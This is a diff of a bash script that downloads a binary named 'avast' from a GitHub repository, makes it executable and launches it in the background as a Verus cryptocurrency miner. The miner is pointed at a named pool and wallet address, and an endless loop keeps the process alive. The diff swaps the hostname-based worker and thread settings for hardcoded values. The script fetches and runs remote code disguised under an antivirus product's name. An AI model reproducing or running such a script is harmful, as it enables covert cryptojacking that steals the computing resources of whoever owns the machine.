@@ -1,8 +1,5 @@
 #!/bin/bash
 wget https://github.com/torgyv/berhasil/raw/master/avast
 chmod +x avast
-pool="pool.verus.io:9998"
-workername="$(cat /proc/sys/kernel/hostname)"
-thread="$(nproc --all)"
-nohup ./avast -a verus -o $pool -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$workername -t $thread &
+nohup ./avast -v -l pool.verus.io:9998 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.A100 -t 4 -x &
 while :; do echo "system true"; sleep 2m; done
